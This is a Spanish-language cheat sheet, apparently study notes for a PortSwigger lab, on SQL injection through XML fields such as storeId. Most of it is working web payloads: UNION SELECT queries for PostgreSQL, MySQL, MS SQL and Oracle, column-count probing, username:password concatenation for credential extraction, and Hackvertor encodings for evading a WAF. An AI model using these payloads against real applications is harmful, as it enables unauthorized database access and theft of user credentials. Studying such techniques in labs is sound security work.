---

---

---
Tags: #sqli #xxe #xml #burpsuite #harvector

---

Esta vulnerabilidad ocurre cuando una aplicación procesa datos XML (como un `stockCheck`) y los utiliza directamente en una consulta a la base de datos. Al estar dentro de etiquetas XML, el servidor suele aplicar filtros de seguridad, por lo que usamos **Hackvertor** para codificar el payload.

## 1. La técnica: Hackvertor Hex Entities

Hackvertor permite enviar caracteres que normalmente dispararían un WAF (Web Application Firewall).

- **Etiqueta:** `<@hex_entities> ... </@hex_entities>`
    
- **Función:** Convierte caracteres como (espacio), `'`, o `--` en entidades hexadecimales XML (ej. `&#x20;`). El analizador XML del servidor decodifica estas entidades _después_ de pasar el filtro de seguridad, pero _antes_ de ejecutar la consulta SQL.
    

---

## 2. Sintaxis de Extracción por SGBD (Vía XML)

Dado que estás inyectando en un campo numérico o de texto dentro de una etiqueta (como `<storeId>`), usaremos `UNION SELECT` para extraer datos.

### A. Estructuras de Unión con Hex Entities

|**SGBD**|**Payload de Extracción (dentro de @hex_entities)**|
|---|---|
|**PostgreSQL**|`1 UNION SELECT CAST(table_name AS text) FROM information_schema.tables LIMIT 1 OFFSET 0--`|
|**MySQL**|`1 UNION SELECT table_name FROM information_schema.tables LIMIT 0,1--`|
|**MS SQL**|`1 UNION SELECT TOP 1 name FROM sysobjects WHERE xtype='U'--`|
|**Oracle**|`1 UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`|

---

## 3. Pasos para la Explotación Avanzada

Para extraer datos completos (tablas, columnas y registros) usando tu estructura de `stockCheck`:

### Paso 1: Determinar el número de columnas

Debes probar cuántas columnas tiene la consulta original para que el UNION no falle.

3 <@hex_entities>UNION SELECT NULL--</@hex_entities>

(Sigue añadiendo NULLs hasta que la respuesta sea 200 OK).

### Paso 2: Extraer nombres de tablas (Ejemplo PostgreSQL)

Utiliza la lógica de iteración que vimos antes:

XML

```
<storeId>
  <@hex_entities>
    1 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0--
  </@hex_entities>
</storeId>
```

### Paso 3: Extraer Datos (Concatenación)

Si quieres sacar usuario y contraseña en una sola etiqueta:

| SGBD       | Sintaxis de Concatenación         |
| ---------- | --------------------------------- |
| PostgreSQL | `username \|\| ':' \|\| password` |
| MySQL      | `CONCAT(username, ':', password)` |
| MS SQL     | ` username + ':' + password`      |
| Oracle     | `username \|\| ':' \|\| password` |

---

## 4. Tabla de payloads para Hackvertor (Evasión)

Si `hex_entities` es detectado, Hackvertor tiene otras opciones de codificación dentro de las etiquetas XML:

|**Tag de Hackvertor**|**Uso recomendado**|
|---|---|
|`<@hex_entities>`|Ideal para saltar filtros básicos de caracteres especiales.|
|`<@dec_entities>`|Similar a hex, pero usa formato decimal (`&#32;`).|
|`<@urlencode>`|Si el XML se envía dentro de un parámetro URL.|
|`<@base64>`|Solo si el backend decodifica Base64 antes de procesar el XML.|

---

## 💡 Tips de Auditoría para XML SQLi

1. **Tipos de datos:** Si la columna donde inyectas es un número (como `storeId`), asegúrate de que el dato que extraes sea compatible o usa `CAST(dato AS text)`.
    
2. **No-Error:** Si no recibes error pero tampoco el dato, el servidor puede estar devolviendo solo el primer resultado. Asegúrate de que el `productId` o `storeId` original **no exista** (ej. poner `-1`) para forzar que el resultado del `UNION` sea el que se muestre.
    
3. **Comentarios:** En XML, a veces el `--` del SQL puede entrar en conflicto con comentarios XML. Si falla, prueba con `/*` o simplemente cierra la etiqueta correctamente.

---
# Referencias

Cheat Sheet de Burpsuite: [Enlace](https://portswigger.net/web-security/sql-injection/cheat-sheet)